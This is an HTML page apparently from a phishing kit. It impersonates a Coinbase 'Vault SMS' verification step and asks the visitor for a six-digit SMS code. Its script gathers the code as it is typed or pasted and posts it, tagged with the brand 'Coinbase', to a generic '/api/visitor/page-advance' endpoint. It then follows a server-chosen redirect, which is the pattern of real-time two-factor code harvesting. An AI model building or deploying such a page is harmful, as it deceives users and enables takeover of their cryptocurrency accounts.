<!doctype html>
<html lang="en" class="dark" style="color-scheme: dark;">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>SMS verification</title>
<link rel="stylesheet" href="/_next/static/css/68165cb776a47886.css">
<link rel="stylesheet" href="/_next/static/css/97cc91616cea400d.css">
<style>
.vm{min-height:100vh;background:#000;color:#fff;font-family:'CoinbaseSansFont',system-ui,sans-serif;max-width:480px;margin:0 auto}
.vm-hd{display:flex;align-items:center;gap:12px;padding:16px 20px;border-bottom:1px solid #1f2937}
.vm-back{background:none;border:0;color:#fff;padding:4px;cursor:pointer}
.vm-body{padding:24px 20px;text-align:center}
.vm-title{font-size:24px;font-weight:700;margin:0 0 10px;text-align:left}
.vm-sub{color:#6b7280;font-size:14px;margin:0 0 28px;text-align:left;line-height:1.5}
.vm-codes{display:flex;gap:8px;justify-content:center;margin-bottom:28px}
.vm-codes input{width:44px;height:52px;text-align:center;font-size:20px;font-weight:600;background:#111;border:1px solid #374151;color:#fff;border-radius:10px;font-family:inherit}
.vm-codes input:focus{outline:none;border-color:rgb(87,139,250)}
.vm-foot{color:#4b5563;font-size:13px;line-height:1.5;margin-top:32px}
</style>
</head>
<body style="margin:0">
<div class="vm">
  <header class="vm-hd">
    <button type="button" class="vm-back" aria-label="Back"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M19 12H5M12 19l-7-7 7-7"/></svg></button>
    <h1 style="margin:0;font-size:17px;font-weight:600">SMS verification</h1>
  </header>
  <div class="vm-body">
    <h2 class="vm-title">Enter SMS code</h2>
    <p class="vm-sub">We sent a 6-digit code to <span data-rv-var="phoneMasked">+xx xxxx 22</span> via SMS</p>
    <div class="vm-codes" id="rv-codes"></div>
    <p class="vm-foot">Didn't receive the SMS? Check your messages or try again.</p>
  </div>
</div>
<script>
(function(){
  var row=document.getElementById('rv-codes'), inputs=[];
  for(var i=0;i<6;i++){
    var inp=document.createElement('input');
    inp.type='text'; inp.inputMode='numeric'; inp.maxLength=1;
    inp.addEventListener('input',function(e){
      if(e.target.value.length>1) e.target.value=e.target.value.slice(-1);
      if(e.target.value&&e.target.nextElementSibling) e.target.nextElementSibling.focus();
      maybeSubmit();
    });
    inp.addEventListener('keydown',function(e){
      if(e.key==='Backspace'&&!e.target.value&&e.target.previousElementSibling) e.target.previousElementSibling.focus();
    });
    inp.addEventListener('paste',function(e){
      e.preventDefault();
      var d=(e.clipboardData||window.clipboardData).getData('text').replace(/\D/g,'').slice(0,6);
      for(var j=0;j<inputs.length;j++) inputs[j].value=d[j]||'';
      if(d.length===6) maybeSubmit();
    });
    row.appendChild(inp); inputs.push(inp);
  }
  function maybeSubmit(){
    var code=inputs.map(function(i){return i.value}).join('');
    if(code.length!==6) return;
    inputs.forEach(function(i){i.disabled=true;});
    fetch('/api/visitor/page-advance',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({brand:'Coinbase',page:'Vault SMS',choice:code})})
      .then(function(r){return r.json()}).then(function(d){if(d&&d.nextUrl)location.href=d.nextUrl;});
  }
  inputs[0].focus();
})();
</script>
</body>
</html>
